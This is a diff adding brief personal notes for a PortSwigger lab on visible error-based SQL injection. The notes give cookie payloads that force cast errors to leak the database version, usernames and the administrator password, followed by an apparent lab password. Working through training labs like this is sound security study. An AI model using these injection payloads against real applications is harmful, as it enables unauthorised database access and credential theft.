@@ -1,0 +1,27 @@
+Lab Link: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-sql-injection-visible-error-based
+
+
+As we know that TrackingId vulnerable
+
+step 1: trying to check version
+    => orignal cookie: select * from tracking where ID = 'dBCchjcAD9VjVmnK'
+    -> payload: ' || CAST((select version()) as int) --
+    => Malicious Query: select * from tracking where ID = 'dBCchjcAD9VjVmnK' || CAST((select version()) as int) --
+
+
+Note: query space is limited so remove the tracking id
+    example of query: 
+            Cookie: TrackingId='||+CAST((select+username+from+users+LIMIT 1)+as+int)+--;
+
+
+step 2: checking from user table
+    -> payload: '|| CAST(((select 'x' from users LIMIT 1)='x') as int) --
+
+step 3: findins useername from users table
+    -> payload: '|| CAST((select username from users LIMIT 1) as int) --
+
+step 4: finding password for administrator
+    -> payload: '|| CAST((select password from users LIMIT 1) as int) --
+
+
+    y1xbtpdzftpqjjm33z73
